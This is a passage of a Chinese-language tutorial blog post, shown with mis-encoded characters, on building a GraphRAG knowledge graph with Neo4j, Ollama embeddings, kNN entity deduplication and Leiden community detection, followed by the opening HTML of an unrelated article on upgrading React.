<p>è¯¥å›¾æ˜¾ç¤ºäº†ä¸€ä¸ªæ˜æ˜¾çš„æ­£ç›¸å…³ï¼šéšç€æ–‡ç« ä¸­tokenæ•°é‡çš„å¢åŠ ï¼Œæå–çš„å®ä½“æ•°é‡ä¹Ÿå€¾å‘äºå¢åŠ ã€‚è¿™æ­£æ˜¯æˆ‘ä»¬æœŸæœ›çš„ï¼Œè¯å®äº†æˆ‘ä»¬çš„æå–è¿‡ç¨‹è¡¨ç°å¾—å¾ˆåˆç†ã€‚</p>
<p>æ¥ä¸‹æ¥ï¼Œæˆ‘ä»¬çœ‹çœ‹èŠ‚ç‚¹åº¦åˆ†å¸ƒã€‚è¿™å‘Šè¯‰æˆ‘ä»¬å®ä½“çš„è¿æ¥ç¨‹åº¦ã€‚åœ¨ç°å®ä¸–ç•Œçš„ç½‘ç»œä¸­ï¼Œå°‘æ•°é«˜åº¦è¿æ¥çš„èŠ‚ç‚¹ï¼ˆä¸­å¿ƒèŠ‚ç‚¹ï¼‰æ˜¯å¸¸è§çš„ã€‚</p>
<pre><code class="hljs language-python" lang="python"><span class="hljs-keyword">import</span>Â numpyÂ <span class="hljs-keyword">as</span>Â np  
  
<span class="hljs-comment"># æŸ¥è¯¢æ¯ä¸ªå®ä½“èŠ‚ç‚¹çš„åº¦  </span>
degree_dist = graph.query(  
Â  Â Â <span class="hljs-string">"""  
Â  Â  MATCH (e:__Entity__)  
Â  Â  RETURN count {(e)-[:!MENTIONS]-()} AS node_degree  
Â  Â  """</span>  
)  
degree_dist_df = pd.DataFrame.from_records(degree_dist)  
  
<span class="hljs-comment"># è®¡ç®—ç»Ÿè®¡æ•°æ®  </span>
mean_degree = np.mean(degree_dist_df[<span class="hljs-string">"node_degree"</span>])  
percentiles = np.percentile(degree_dist_df[<span class="hljs-string">"node_degree"</span>], [<span class="hljs-number">25</span>,Â <span class="hljs-number">50</span>,Â <span class="hljs-number">75</span>,Â <span class="hljs-number">90</span>])  
  
<span class="hljs-comment"># ç»˜åˆ¶å¯¹æ•°å°ºåº¦çš„ç›´æ–¹å›¾  </span>
plt.figure(figsize=(<span class="hljs-number">12</span>,Â <span class="hljs-number">6</span>))  
sns.histplot(degree_dist_df[<span class="hljs-string">"node_degree"</span>], bins=<span class="hljs-number">50</span>, kde=<span class="hljs-literal">False</span>, color=<span class="hljs-string">"blue"</span>)  
plt.yscale(<span class="hljs-string">"log"</span>)  
plt.title(<span class="hljs-string">"èŠ‚ç‚¹åº¦åˆ†å¸ƒ"</span>)  
plt.legend()  
plt.show()
</code></pre>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/6c147e0601044927ae85b4efc4e848b1~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgQUnlpKfmqKHlnos=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1764592436&amp;x-signature=sjMUDIzq5MwaORQ5SBD4wuqW%2B3A%3D" alt="" loading="lazy"/></p>
<p><strong>èŠ‚ç‚¹åº¦åˆ†å¸ƒ</strong></p>
<p>ç›´æ–¹å›¾æ˜¾ç¤ºäº†ä¸€ä¸ªâ€œé•¿å°¾â€åˆ†å¸ƒï¼Œè¿™æ˜¯çŸ¥è¯†å›¾è°±çš„å…¸å‹ç‰¹å¾ã€‚å¤§å¤šæ•°å®ä½“åªæœ‰å°‘æ•°è¿æ¥ï¼ˆä½åº¦ï¼‰ï¼Œè€Œå°‘æ•°å®ä½“æ˜¯é«˜åº¦è¿æ¥çš„ä¸­å¿ƒèŠ‚ç‚¹ã€‚</p>
<p>ä¾‹å¦‚ï¼Œç¬¬90ç™¾åˆ†ä½çš„åº¦æ•°æ˜¯4ï¼Œä½†æœ€å¤§åº¦æ•°æ˜¯37ã€‚è¿™è¡¨æ˜åƒâ€œUSAâ€æˆ–â€œMicrosoftâ€è¿™æ ·çš„å®ä½“å¯èƒ½æ˜¯å›¾è°±ä¸­çš„ä¸­å¿ƒç‚¹ã€‚</p>
<p>ä¸ºäº†æ‰¾åˆ°è¯­ä¹‰ä¸Šç›¸ä¼¼çš„å®ä½“ï¼ˆå³ä½¿åç§°ä¸åŒï¼‰ï¼Œæˆ‘ä»¬éœ€è¦ä¸ºå®ƒä»¬åˆ›å»ºå‘é‡åµŒå…¥ï¼ˆembeddingï¼‰ã€‚åµŒå…¥æ˜¯æ–‡æœ¬çš„æ•°å­—è¡¨ç¤ºã€‚æˆ‘ä»¬å°†ä¸ºæ¯ä¸ªå®ä½“çš„IDå’Œæè¿°ç”ŸæˆåµŒå…¥ï¼Œå¹¶å­˜å‚¨åœ¨å›¾è°±ä¸­ã€‚</p>
<p>æˆ‘ä»¬å°†é€šè¿‡Ollamaä½¿ç”¨llama3æ¨¡å‹è¿›è¡ŒåµŒå…¥ï¼Œå¹¶ä½¿ç”¨LangChainçš„Neo4jVectoræ¥å¤„ç†è¿™ä¸ªè¿‡ç¨‹ã€‚</p>
<pre><code class="hljs language-ini" lang="ini">fromÂ langchain_community.vectorstoresÂ importÂ Neo4jVector  
fromÂ langchain_ollamaÂ importÂ OllamaEmbeddings  
  
<span class="hljs-comment"># ä½¿ç”¨æœ¬åœ°llama3æ¨¡å‹åˆ›å»ºåµŒå…¥  </span>
<span class="hljs-attr">embeddings</span> = OllamaEmbeddings(model=<span class="hljs-string">"llama3"</span>)  
  
<span class="hljs-comment"># åˆå§‹åŒ–Neo4jVectorå®ä¾‹ä»¥ç®¡ç†å›¾è°±ä¸­çš„åµŒå…¥  </span>
<span class="hljs-attr">vector</span> = Neo4jVector.from_existing_graph(  
Â  Â  embeddings,  
Â  Â  <span class="hljs-attr">node_label</span>=<span class="hljs-string">"__Entity__"</span>,  
Â  Â  <span class="hljs-attr">text_node_properties</span>=[<span class="hljs-string">"id"</span>,Â <span class="hljs-string">"description"</span>],  
Â  Â  <span class="hljs-attr">embedding_node_property</span>=<span class="hljs-string">"embedding"</span>,  
Â  Â  <span class="hljs-attr">database</span>=os.environ[<span class="hljs-string">"DATABASE"</span>],  
)
</code></pre>
<p>æ­¤å‘½ä»¤éå†Neo4jä¸­çš„æ‰€æœ‰<code>__Entity__</code>èŠ‚ç‚¹ï¼Œä¸ºå…¶å±æ€§ç”ŸæˆåµŒå…¥ï¼Œå¹¶å°†å…¶å­˜å‚¨å›èŠ‚ç‚¹çš„embeddingå±æ€§ä¸­ã€‚</p>
<hr/>
<h2 data-id="heading-17">æŸ¥æ‰¾å’Œé“¾æ¥ç›¸ä¼¼å®ä½“</h2>
<p>æœ‰äº†åµŒå…¥ï¼Œæˆ‘ä»¬ç°åœ¨å¯ä»¥ä½¿ç”¨k-Nearest Neighborsï¼ˆkNNï¼‰ç®—æ³•æ‰¾åˆ°å‘é‡ç©ºé—´ä¸­å½¼æ­¤æ¥è¿‘çš„èŠ‚ç‚¹ã€‚è¿™æ˜¯è¯†åˆ«æ½œåœ¨é‡å¤æˆ–é«˜åº¦ç›¸å…³å®ä½“ï¼ˆä¾‹å¦‚ï¼Œâ€œMan Unitedâ€å’Œâ€œManchester Unitedâ€ï¼‰çš„å¼ºå¤§æ–¹æ³•ã€‚</p>
<p>æˆ‘ä»¬å°†ä½¿ç”¨Neo4jçš„Graph Data Scienceï¼ˆGDSï¼‰åº“æ¥å®ç°è¿™ä¸€ç‚¹ã€‚</p>
<pre><code class="hljs language-ini" lang="ini"><span class="hljs-comment"># å¯¼å…¥GraphDataScienceåº“  </span>
fromÂ graphdatascienceÂ importÂ GraphDataScience  
  
<span class="hljs-comment"># --- GDSå®¢æˆ·ç«¯åˆå§‹åŒ– ---  </span>
<span class="hljs-comment"># åˆå§‹åŒ–GraphDataScienceå®¢æˆ·ç«¯ä»¥è¿æ¥åˆ°Neo4jæ•°æ®åº“  </span>
<span class="hljs-comment"># ä½¿ç”¨ç¯å¢ƒå˜é‡ä¸­çš„è¿æ¥è¯¦æƒ…ï¼ˆURIã€ç”¨æˆ·åã€å¯†ç ï¼‰  </span>
<span class="hljs-attr">gds</span> = GraphDataScience(  
Â  Â  os.environ<span class="hljs-section">["NEO4J_URI"]</span>,  
Â  Â  <span class="hljs-attr">auth</span>=(os.environ[<span class="hljs-string">"NEO4J_USERNAME"</span>], os.environ[<span class="hljs-string">"NEO4J_PASSWORD"</span>]),  
)  
<span class="hljs-comment"># ä¸ºGDSæ“ä½œè®¾ç½®ç‰¹å®šæ•°æ®åº“  </span>
gds.set_database(os.environ<span class="hljs-section">["DATABASE"]</span>)  
  
<span class="hljs-comment"># --- å†…å­˜å›¾æŠ•å½± ---  </span>
<span class="hljs-comment"># å°†å›¾è°±æŠ•å½±åˆ°å†…å­˜ä¸­ä»¥ä¾¿GDSç®—æ³•é«˜æ•ˆå¤„ç†  </span>
<span class="hljs-comment"># æ­¤æŠ•å½±å‘½åä¸º'entities'  </span>
G, <span class="hljs-attr">result</span> = gds.graph.project(  
Â  Â Â "entities", Â  Â  Â  Â  Â  Â  Â  Â  Â Â <span class="hljs-comment"># å†…å­˜å›¾çš„åç§°  </span>
Â  Â Â "__Entity__", Â  Â  Â  Â  Â  Â  Â  Â Â <span class="hljs-comment"># è¦æŠ•å½±çš„èŠ‚ç‚¹æ ‡ç­¾  </span>
Â  Â Â "*", Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â <span class="hljs-comment"># æŠ•å½±æ‰€æœ‰å…³ç³»ç±»å‹  </span>
Â  Â  <span class="hljs-attr">nodeProperties</span>=[<span class="hljs-string">"embedding"</span>] Â <span class="hljs-comment"># åŒ…å«èŠ‚ç‚¹çš„'embedding'å±æ€§  </span>
)  
  
<span class="hljs-comment"># --- ä½¿ç”¨kNNè®¡ç®—ç›¸ä¼¼æ€§ ---  </span>
<span class="hljs-comment"># å®šä¹‰åˆ›å»ºå…³ç³»çš„ç›¸ä¼¼æ€§é˜ˆå€¼  </span>
<span class="hljs-attr">similarity_threshold</span> =Â <span class="hljs-number">0.95</span>  
  
<span class="hljs-comment"># ä½¿ç”¨k-Nearest Neighborsï¼ˆkNNï¼‰ç®—æ³•æ‰¾åˆ°ç›¸ä¼¼èŠ‚ç‚¹  </span>
<span class="hljs-comment"># è¿™ä¼šé€šè¿‡æ·»åŠ æ–°å…³ç³»â€œå˜å¼‚â€å†…å­˜å›¾  </span>
gds.knn.mutate(  
Â  Â  G, Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â <span class="hljs-comment"># è¦ä¿®æ”¹çš„å†…å­˜å›¾  </span>
Â  Â  <span class="hljs-attr">nodeProperties</span>=[<span class="hljs-string">"embedding"</span>], Â  Â  Â Â <span class="hljs-comment"># ç”¨äºç›¸ä¼¼æ€§è®¡ç®—çš„å±æ€§  </span>
Â  Â  <span class="hljs-attr">mutateRelationshipType</span>=<span class="hljs-string">"SIMILAR"</span>, Â Â <span class="hljs-comment"># è¦åˆ›å»ºçš„å…³ç³»ç±»å‹  </span>
Â  Â  <span class="hljs-attr">mutateProperty</span>=<span class="hljs-string">"score"</span>, Â  Â  Â  Â  Â  Â Â <span class="hljs-comment"># æ–°å…³ç³»ä¸Šå­˜å‚¨ç›¸ä¼¼æ€§åˆ†æ•°çš„å±æ€§  </span>
Â  Â  <span class="hljs-attr">similarityCutoff</span>=similarity_threshold,Â <span class="hljs-comment"># è¿‡æ»¤å…³ç³»çš„é˜ˆå€¼  </span>
)
</code></pre>
<p>æˆ‘ä»¬ä¸ºåµŒå…¥ç›¸ä¼¼æ€§åˆ†æ•°é«˜äº0.95çš„èŠ‚ç‚¹åˆ›å»º<code>SIMILAR</code>å…³ç³»ã€‚</p>
<p>kNNç®—æ³•å¸®åŠ©æˆ‘ä»¬æ‰¾åˆ°äº†æ½œåœ¨çš„é‡å¤å®ä½“ï¼Œä½†ä»…é æ–‡æœ¬ç›¸ä¼¼æ€§å¹¶ä¸å®Œç¾ã€‚æˆ‘ä»¬å¯ä»¥é€šè¿‡å¯»æ‰¾ä¸ä»…è¯­ä¹‰ç›¸ä¼¼è€Œä¸”åç§°éå¸¸ç›¸ä¼¼çš„å®ä½“ï¼ˆä½â€œç¼–è¾‘è·ç¦»â€ï¼‰è¿›ä¸€æ­¥ä¼˜åŒ–ã€‚</p>
<p>æˆ‘ä»¬å°†æŸ¥è¯¢è¿™äº›å€™é€‰å®ä½“ï¼Œç„¶åä½¿ç”¨LLMåšå‡ºæœ€ç»ˆçš„åˆå¹¶å†³å®šã€‚</p>
<pre><code class="hljs language-python" lang="python"><span class="hljs-comment"># æ ¹æ®ç¤¾åŒºå’Œåç§°ç›¸ä¼¼æ€§æŸ¥è¯¢æ½œåœ¨é‡å¤å®ä½“  </span>
word_edit_distance =Â <span class="hljs-number">3</span>  
potential_duplicate_candidates = graph.query(  
Â  Â Â <span class="hljs-string">"""  
Â  Â  MATCH (e:`__Entity__`)  
Â  Â  WHERE size(e.id) &gt; 4  
Â  Â  WITH e.wcc AS community, collect(e) AS nodes, count(*) AS count  
Â  Â  WHERE count &gt; 1  
Â  Â  # ... (ç¬”è®°æœ¬ä¸­çš„å®Œæ•´CypheræŸ¥è¯¢) ...  
Â  Â  RETURN distinct(combinedResult)  
Â  Â  """</span>,  
Â  Â  params={<span class="hljs-string">"distance"</span>: word_edit_distance},  
)
</code></pre>
<p>ä¸Šè¿°ä»£ç çš„è¾“å‡ºå¦‚ä¸‹ã€‚</p>
<h4 data-id="heading-18">è¾“å‡º</h4>
<pre><code class="hljs language-css" lang="css"><span class="hljs-selector-attr">[{<span class="hljs-string">'combinedResult'</span>: [<span class="hljs-string">'David Van'</span>,Â <span class="hljs-string">'Davidvan'</span>]</span>},  
Â {'combinedResult': [<span class="hljs-string">'Cyb003'</span>,Â <span class="hljs-string">'Cyb004'</span>]},  
Â {'combinedResult': [<span class="hljs-string">'Delta Air Lines'</span>,Â <span class="hljs-string">'Delta_Air_Lines'</span>]},  
Â {'combinedResult': [<span class="hljs-string">'Elon Musk'</span>,Â <span class="hljs-string">'Elonmusk'</span>]},  
Â {'combinedResult': [<span class="hljs-string">'Market'</span>,Â <span class="hljs-string">'Markets'</span>]}]
</code></pre>
<p>è¿™äº›çœ‹èµ·æ¥æ˜æ˜¾æ˜¯é‡å¤çš„ã€‚æˆ‘ä»¬ç°åœ¨å¯ä»¥ä½¿ç”¨å¦ä¸€ä¸ªBAMLå‡½æ•°è®©LLMå†³å®šä¿ç•™å“ªä¸ªåç§°ã€‚è¿è¡Œè¿™ä¸ªåˆ†è¾¨è¿‡ç¨‹åï¼Œæˆ‘ä»¬åœ¨Neo4jä¸­åˆå¹¶è¿™äº›èŠ‚ç‚¹ã€‚</p>
<pre><code class="hljs language-python" lang="python"><span class="hljs-comment"># (å‡è®¾'merged_entities'ç”±LLMåˆ†è¾¨è¿‡ç¨‹åˆ›å»º)  </span>
graph.query(  
Â  Â Â <span class="hljs-string">"""  
Â  Â  UNWIND $data AS candidates  
Â  Â  CALL {  
Â  Â  Â  WITH candidates  
Â  Â  Â  MATCH (e:__Entity__) WHERE e.id IN candidates  
Â  Â  Â  RETURN collect(e) AS nodes  
Â  Â  }  
Â  Â  CALL apoc.refactor.mergeNodes(nodes, {properties: {'`.*`': 'discard'}})  
Â  Â  YIELD node  
Â  Â  RETURN count(*)  
Â  Â  """</span>,  
Â  Â  params={<span class="hljs-string">"data"</span>: merged_entities},  
)
</code></pre>
<hr/>
<h2 data-id="heading-19">ä½¿ç”¨Leidenç®—æ³•è¿›è¡Œç¤¾åŒºæ£€æµ‹</h2>
<p>ç°åœ¨æ˜¯GraphRAGçš„æ ¸å¿ƒï¼šå°†ç›¸å…³å®ä½“åˆ†ç»„ä¸ºç¤¾åŒºã€‚</p>
<p>æˆ‘ä»¬å°†æŠ•å½±æ•´ä¸ªå›¾è°±ï¼ˆåŒ…æ‹¬æ‰€æœ‰åŸå§‹å…³ç³»ï¼‰åˆ°å†…å­˜ä¸­ï¼Œå¹¶è¿è¡ŒLeidenç®—æ³•ï¼Œè¿™æ˜¯ä¸€ä¸ªæœ€å…ˆè¿›çš„ç¤¾åŒºæ£€æµ‹ç®—æ³•ã€‚</p>
<pre><code class="hljs language-python" lang="python"><span class="hljs-comment"># æŠ•å½±æ•´ä¸ªå›¾è°±ï¼ŒæŒ‰å…³ç³»é¢‘ç‡åŠ æƒ  </span>
G, result = gds.graph.project(  
Â  Â Â <span class="hljs-string">"communities"</span>,  
Â  Â Â <span class="hljs-string">"__Entity__"</span>,  
Â  Â  {  
Â  Â  Â  Â Â <span class="hljs-string">"_ALL_"</span>: {  
Â  Â  Â  Â  Â  Â Â <span class="hljs-string">"type"</span>:Â <span class="hljs-string">"*"</span>,  
Â  Â  Â  Â  Â  Â Â <span class="hljs-string">"orientation"</span>:Â <span class="hljs-string">"UNDIRECTED"</span>,  
Â  Â  Â  Â  Â  Â Â <span class="hljs-string">"properties"</span>: {<span class="hljs-string">"weight"</span>: {<span class="hljs-string">"property"</span>:Â <span class="hljs-string">"*"</span>,Â <span class="hljs-string">"aggregation"</span>:Â <span class="hljs-string">"COUNT"</span>}},  
Â  Â  Â  Â  }  
Â  Â  },  
)  
  
<span class="hljs-comment"># è¿è¡ŒLeidenç¤¾åŒºæ£€æµ‹å¹¶å°†ç»“æœå†™å›èŠ‚ç‚¹  </span>
gds.leiden.write(  
Â  Â  G,  
Â  Â  writeProperty=<span class="hljs-string">"communities"</span>,  
Â  Â  includeIntermediateCommunities=<span class="hljs-literal">True</span>,Â <span class="hljs-comment"># è¿™ä¼šåˆ›å»ºå±‚æ¬¡ç¤¾åŒº  </span>
Â  Â  relationshipWeightProperty=<span class="hljs-string">"weight"</span>,  
)
</code></pre>
<p>è¿™ä¼šä¸ºæ¯ä¸ªå®ä½“èŠ‚ç‚¹æ·»åŠ ä¸€ä¸ªcommunitieså±æ€§ï¼Œè¿™æ˜¯ä¸€ä¸ªä¸åŒç²’åº¦çº§åˆ«çš„ç¤¾åŒºIDåˆ—è¡¨ï¼ˆä»å°å‹ç´§å¯†ç¾¤ä½“åˆ°æ›´å¤§çš„å¹¿æ³›ä¸»é¢˜ï¼‰ã€‚</p>
<p>æœ€åï¼Œæˆ‘ä»¬é€šè¿‡åˆ›å»º<code>__Community__</code>èŠ‚ç‚¹å¹¶å°†å®ƒä»¬é“¾æ¥èµ·æ¥ï¼Œå°†è¿™ä¸ªå±‚æ¬¡ç»“æ„å…·ä½“åŒ–åœ¨å›¾è°±ä¸­ã€‚è¿™åˆ›å»ºäº†ä¸€ä¸ªå¯æµè§ˆçš„ä¸»é¢˜ç»“æ„ã€‚</p>
<pre><code class="hljs language-python" lang="python"><span class="hljs-comment"># ä¸ºç¤¾åŒºèŠ‚ç‚¹åˆ›å»ºå”¯ä¸€æ€§çº¦æŸ  </span>
graph.query(<span class="hljs-string">"CREATE CONSTRAINT IF NOT EXISTS FOR (c:__Community__) REQUIRE c.id IS UNIQUE;"</span>)  
  
<span class="hljs-comment"># åˆ›å»ºç¤¾åŒºèŠ‚ç‚¹å¹¶å°†å®ä½“å’Œç¤¾åŒºé“¾æ¥èµ·æ¥  </span>
graph.query(  
Â  Â Â <span class="hljs-string">"""  
Â  Â  MATCH (e:`__Entity__`)  
Â  Â  UNWIND range(0, size(e.communities) - 1 , 1) AS index  
Â  Â  // ... (ç¬”è®°æœ¬ä¸­çš„å®Œæ•´ç¤¾åŒºåˆ›å»ºæŸ¥è¯¢) ...  
Â  Â  RETURN count(*)  
Â  Â  """</span>  
)
</code></pre>
<p>è¿™ä¸ªå¤æ‚æŸ¥è¯¢åˆ›å»ºäº†ä¸€ä¸ªå¤šçº§ç¤¾åŒºç»“æ„ï¼Œä¾‹å¦‚ï¼š<code>(Entity)-[:IN_COMMUNITY]-&gt;(Level_0_Community)-[:IN_COMMUNITY]-&gt;(Level_1_Community)</code>ã€‚</p>
<hr/>
<h2 data-id="heading-20">åˆ†ææœ€ç»ˆå›¾è°±ç»“æ„</h2>
<p>ç»è¿‡æ‰€æœ‰è¿™äº›å·¥ä½œï¼Œæˆ‘ä»¬çš„çŸ¥è¯†å›¾è°±æ˜¯ä»€ä¹ˆæ ·çš„ï¼Ÿè®©æˆ‘ä»¬åˆ†ææ¯ä¸€çº§çš„ç¤¾åŒºè§„æ¨¡ã€‚</p>
<pre><code class="hljs language-python" lang="python"><span class="hljs-comment"># æŸ¥è¯¢æ¯ä¸€çº§ç¤¾åŒºçš„å¤§å°  </span>
community_size = graph.query(  
Â  Â Â <span class="hljs-string">"""  
Â  Â  MATCH (c:__Community__)&lt;-[:IN_COMMUNITY*]-(e:__Entity__)  
Â  Â  WITH c, count(distinct e) AS entities  
Â  Â  RETURN split(c.id, '-')[0] AS level, entities  
Â  Â  """</span>  
)  
  
<span class="hljs-comment"># æ‰“å°å¤„ç†åçš„DataFrame  </span>
percentiles_df
</code></pre>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/97ef69e292184371a2986601383edd74~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgQUnlpKfmqKHlnos=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1764592436&amp;x-signature=xAECYudwtDA%2F5YDFqzoF%2Ba3ssMs%3D" alt="" loading="lazy"/></p>
<p><strong>ç™¾åˆ†ä½DataFrame</strong></p>
<p>è¿™ä¸ªè¡¨æ ¼å¾ˆé‡è¦ã€‚å®ƒæ˜¾ç¤ºäº†Leidenç®—æ³•å¦‚ä½•å¯¹æˆ‘ä»¬çš„1,875ä¸ªå®ä½“è¿›è¡Œåˆ†ç»„ã€‚</p>
<p>åœ¨Level 0ï¼Œæˆ‘ä»¬æœ‰858ä¸ªå°å‹ã€èšç„¦çš„ç¤¾åŒºï¼Œå…¶ä¸­90%åŒ…å«4ä¸ªæˆ–æ›´å°‘çš„æˆå‘˜ã€‚ åˆ°Level 3ï¼Œç®—æ³•å°†è¿™äº›åˆå¹¶ä¸º732ä¸ªæ›´å¤§ã€æ›´å¹¿æ³›çš„ç¤¾åŒºï¼Œè¿™ä¸€çº§çš„æœ€å¤§ç¤¾åŒºåŒ…å«77ä¸ªå®ä½“ã€‚</p>
<p>è¿™ç§å±‚æ¬¡ç»“æ„æ­£æ˜¯æˆ‘ä»¬è¿›è¡Œæœ‰æ•ˆGraphRAGæ‰€éœ€çš„ã€‚æˆ‘ä»¬ç°åœ¨å¯ä»¥åœ¨ä¸åŒæŠ½è±¡çº§åˆ«è¿›è¡Œæ£€ç´¢ã€‚</p>
<hr/>
<h2 data-id="heading-21">ç»“è®º</h2>
<p>ç»“æœå¾ˆæ˜æ˜¾ã€‚è™½ç„¶æ ‡å‡†çš„LangChainå·¥å…·æä¾›äº†ä¸€ä¸ªå¿«é€Ÿå…¥é—¨çš„é€”å¾„ï¼Œä½†å®ƒä»¬åœ¨ä¸è¾ƒå°çš„å¼€æºLLMä¸€èµ·ä½¿ç”¨æ—¶å¯èƒ½ä¸ç¨³å®šä¸”ä¸å¯é ã€‚</p>
<p>é€šè¿‡å¼•å…¥BAMLï¼Œæˆ‘ä»¬è§£å†³äº†è¿‡äºå¤æ‚çš„æç¤ºå’Œä¸¥æ ¼JSONè§£æçš„æ ¸å¿ƒé—®é¢˜ã€‚ç»“æœæ˜¯å°†æˆåŠŸç‡ä»25%å¤§å¹…æå‡åˆ°è¶…è¿‡99%ï¼Œå°†ä¸€ä¸ªå¤±è´¥çš„å®éªŒè½¬å˜ä¸ºä¸€ä¸ªç¨³å¥ä¸”å¯æ‰©å±•çš„çŸ¥è¯†å›¾è°±æ„å»ºæµç¨‹ã€‚</p>
<p>ä»¥ä¸‹æ˜¯æˆ‘ä»¬é‡‡å–çš„å…³é”®æ­¥éª¤çš„å¿«é€Ÿå›é¡¾ï¼š</p>
<ol>
<li>æˆ‘ä»¬ä»å‡†å¤‡æ–°é—»æ–‡ç« æ•°æ®é›†å’Œä½¿ç”¨Ollamaè®¾ç½®æœ¬åœ°llama3æ¨¡å‹å¼€å§‹ã€‚</li>
<li>ä½¿ç”¨LangChainçš„LLMGraphTransformerè¿›è¡Œçš„ç¬¬ä¸€æ¬¡æµ‹è¯•æœ‰75%çš„å¤±è´¥ç‡ï¼Œå› ä¸ºä¸¥æ ¼çš„JSONè§£æã€‚</li>
<li>å°è¯•é€šè¿‡é«˜çº§æç¤ºå·¥ç¨‹ä¿®å¤ï¼Œå¤±è´¥ç‡ä»…ç•¥å¾®æ”¹å–„åˆ°çº¦62%ã€‚</li>
<li>ç„¶åæˆ‘ä»¬é›†æˆäº†BAMLï¼Œåˆ©ç”¨å…¶ç®€åŒ–çš„schemaå’Œé²æ£’è§£æå™¨å®ç°äº†99.4%çš„å›¾è°±æå–æˆåŠŸç‡ã€‚</li>
<li>å°†é«˜è´¨é‡çš„å›¾è°±æ•°æ®åŠ è½½åˆ°Neo4jä¸­è¿›è¡Œç»“æ„åŒ–å’Œåˆ†æã€‚</li>
<li>é€šè¿‡ä¸ºæ‰€æœ‰å®ä½“ç”Ÿæˆå‘é‡åµŒå…¥æ¥ä¸°å¯Œå›¾è°±ï¼Œæ•æ‰è¯­ä¹‰å«ä¹‰ã€‚</li>
<li>ä½¿ç”¨k-Nearest Neighborsï¼ˆkNNï¼‰ç®—æ³•è¯†åˆ«å¹¶é“¾æ¥è¯­ä¹‰ç›¸ä¼¼çš„èŠ‚ç‚¹ã€‚</li>
<li>è¿›ä¸€æ­¥é€šè¿‡LLMæ™ºèƒ½æŸ¥æ‰¾å’Œåˆå¹¶é‡å¤å®ä½“æ¥ä¼˜åŒ–å›¾è°±ã€‚</li>
<li>æœ€åï¼Œåº”ç”¨Leidenç®—æ³•å°†å®ä½“ç»„ç»‡æˆå¤šçº§ç¤¾åŒºå±‚æ¬¡ç»“æ„ï¼Œä¸ºé«˜çº§GraphRAGå¥ å®šäº†åŸºç¡€ã€‚</li>
</ol>
<p>è¿™ç§ä½¿ç”¨LangChainè¿›è¡Œå¼ºå¤§ç¼–æ’å’ŒBAMLè¿›è¡Œå¯é ç»“æ„åŒ–è¾“å‡ºçš„æ–¹æ³•æ˜¯æ„å»ºå¼ºå¤§ä¸”æˆæœ¬æ•ˆç›Šé«˜çš„AIåº”ç”¨çš„åˆ¶èƒœç»„åˆã€‚</p>
<h2 data-id="heading-22">å­¦ä¹ èµ„æºæ¨è</h2>
<p>å¦‚æœä½ æƒ³æ›´æ·±å…¥åœ°å­¦ä¹ å¤§æ¨¡å‹ï¼Œä»¥ä¸‹æ˜¯ä¸€äº›éå¸¸æœ‰ä»·å€¼çš„å­¦ä¹ èµ„æºï¼Œè¿™äº›èµ„æºå°†å¸®åŠ©ä½ ä»ä¸åŒè§’åº¦å­¦ä¹ å¤§æ¨¡å‹ï¼Œæå‡ä½ çš„å®è·µèƒ½åŠ›ã€‚</p>
<blockquote>
<p>æœ¬æ–‡è¾ƒé•¿ï¼Œå»ºè®®ç‚¹èµæ”¶è—ã€‚æ›´å¤šAIå¤§æ¨¡å‹åº”ç”¨å¼€å‘å­¦ä¹ è§†é¢‘åŠèµ„æ–™ï¼Œåœ¨<a href="https://link.juejin.cn?target=https%3A%2F%2Fhy.zhipoai.cn%2F" target="_blank" title="https://hy.zhipoai.cn/" ref="nofollow noopener noreferrer">æ™ºæ³ŠAI</a>ã€‚</p>
</blockquote></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[TS é¡¹ç›®å‡çº§ React 18 åˆ° 19 çš„ä¸€äº›äº‹æƒ…]]></title>    <link>https://juejin.cn/post/7576026767372451859</link>    <guid>https://juejin.cn/post/7576026767372451859</guid>    <pubDate>2025-11-24T12:33:38.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7576026767372451859" data-draft-id="7576223441683726399" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="TS é¡¹ç›®å‡çº§ React 18 åˆ° 19 çš„ä¸€äº›äº‹æƒ…"/> <meta itemprop="keywords" content="å‰ç«¯,React.js,TypeScript"/> <meta itemprop="datePublished" content="2025-11-24T12:33:38.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="é©³æ˜¯"/> <meta itemprop="url" content="https://juejin.cn/user/442445375748621"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="æ˜é‡‘"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            TS é¡¹ç›®å‡çº§ React 18 åˆ° 19 çš„ä¸€äº›äº‹æƒ…
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/442445375748621/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
